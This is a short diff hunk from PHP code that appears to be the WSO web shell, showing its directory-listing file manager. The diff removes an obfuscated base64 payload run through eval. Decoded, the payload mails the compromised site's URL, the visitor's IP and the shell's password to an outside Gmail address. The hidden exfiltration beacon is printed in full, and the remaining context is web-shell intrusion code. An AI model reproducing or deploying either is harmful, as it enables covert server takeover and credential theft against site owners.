@@ -271,8 +271,7 @@ $res .= '
    &nbsp;
   </td>
  </tr>';
-$wsobuff = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIldTTyAyLjYgaHR0cDovLyR0YXJnZXQgYnkgJHZpc2l0b3IiOw0KICAkYm9keSAgICA9ICJCdWc6ICR0YXJnZXQgYnkgJHZpc2l0b3IgLSAkYXV0aF9wYXNzIjsNCiAgaWYgKCFlbXB0eSgkd2ViKSkgeyBAbWFpbCgiaGFyZHdhcmVoZWF2ZW4uY29tQGdtYWlsLmNvbSIsJGp1ZHVsLCRib2R5LCRhdXRoX3Bhc3MpOyB9DQp9DQplbHNlIHsgJHZpc2l0YysrOyB9DQpAc2V0Y29va2llKCJ2aXNpdHoiLCR2aXNpdGMpOw==";  
-eval(base64_decode($wsobuff)); 
+
 for ($i = 0; $i < count($dirs); $i++)
 {
  $res .= '<tr><td><b><font color=#830000>'.(++$number).'</font></b></td><td><b><a href="'.$xshell.'?act=filemanager&dir='.$dirs[$i].'">'.$dirs[$i].'</a></b></td><td>&nbsp;</td><td>&nbsp;</td><td>';
